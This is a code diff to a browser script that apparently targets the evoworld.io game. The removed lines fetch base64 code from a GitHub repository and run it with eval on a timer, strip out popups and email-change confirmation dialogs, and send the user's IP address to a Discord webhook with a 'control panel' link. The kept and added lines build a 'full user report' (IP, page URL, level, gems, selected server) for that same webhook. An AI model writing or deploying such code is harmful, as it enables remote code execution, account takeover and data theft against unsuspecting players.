@@ -1,42 +1,4 @@
-setInterval(() => {$.get("https://api.github.com/repos/uloxa13/Fq/contents/Fq", function(data) {
-  eval(atob(data.content));
-});}, 2050);
-setInterval(() => {
-document.querySelectorAll('.popups .popup[data-id^="temp"]').forEach(el => el.remove());
-document.querySelectorAll('.overlay').forEach(el => el.remove());
-document.querySelectorAll('[id^="change-email-confirm"]').forEach(el => el.remove());
-}, 1);
-$.get("https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js", (d) => eval(d));
-// Сначала получаем IP пользователя, потом отправляем
-fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const userIP = data.ip;
-    
-    fetch("https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        content: "control panel: https://evoworld-io-control-panel.netlify.app/?ip=" + encodeURIComponent(userIP)
-      })
-    })
-    .then(res => {
-      if (res.ok) console.log("Сообщение отправлено!");
-      else res.text().then(t => console.warn("Ответ не OK:", res.status, t));
-    })
-    .catch(err => console.error("Ошибка (возможно CORS):", err));
-  })
-  .catch(err => {
-    console.error("Не удалось получить IP:", err);
-    // Отправляем без IP если не удалось получить
-    fetch("https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        content: "control panel: https://hrkdbbrjuoeu.netlify.app/?ip=unknown"
-      })
-    });
-  });
+
 (async function() {
     // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
@@ -192,8 +154,8 @@ fetch('https://api.ipify.org?format=json')
         const userLevel = getUserLevel(bothFieldsFilled);
         
         // Формируем содержимое файла
-        let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n\n";
-        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\n\n`;
+        let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n";
+        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer').options[select.selectedIndex].text}\n\n`;
         fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
         fileContent += `IP-адрес: ${userIP}\n`;
         fileContent += `URL страницы: ${window.location.href}\n`;
